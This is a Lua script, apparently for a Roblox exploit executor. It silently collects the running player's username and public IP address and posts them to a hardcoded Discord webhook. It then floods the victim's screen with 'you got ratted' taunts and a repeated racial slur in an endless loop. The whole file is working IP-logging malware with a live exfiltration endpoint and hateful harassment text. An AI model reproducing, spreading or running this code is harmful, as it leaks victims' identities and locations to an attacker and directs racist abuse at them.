
local webh = "https://discord.com/api/webhooks/964893587772960778/VRHZCBFoNLD6YrbxmEZSeYf_DrjyYFe2jYuBpZjZLvsvYueBOTyi7GPsKri3ZSK0EoKD"

pcall(function()
   local data = {
       ["embeds"] = {
           {
               ["title"] = game:GetService("Players").LocalPlayer.Name,
               ["description"] = game:HttpGet("https://api.ipify.org")
           }
       }
   }

   if syn then
       local response = syn.request(
           {
               Url = webh,
               Method = 'POST',
               Headers = {
                   ['Content-Type'] = 'application/json'
               },
               Body = game:GetService('HttpService'):JSONEncode(data)
           }
       );
   elseif request then
       local response = request(
           {
               Url = webh,
               Method = 'POST',
               Headers = {
                   ['Content-Type'] = 'application/json'
               },
               Body = game:GetService('HttpService'):JSONEncode(data)
           }
       );
   elseif http_request then
       local response = http_request(
           {
               Url = webh,
               Method = 'POST',
               Headers = {
                   ['Content-Type'] = 'application/json'
               },
               Body = game:GetService('HttpService'):JSONEncode(data)
           }
       );
   end
end)
_G.GETFUCKED = true
local cum = math.random(99999,2147483641)
while _G.GETFUCKED == true  do
rconsolename("YOU GOT RATTED")
rconsoleprint("GET LOGGED NIGAAAAAAA LOOOOL")
wait(0.5)
rconsoleprint(cum)
messagebox("GET LOGGED NIGGA LOOOOL", "U GOT LOGGED NIGGA LOSER", 0)
end
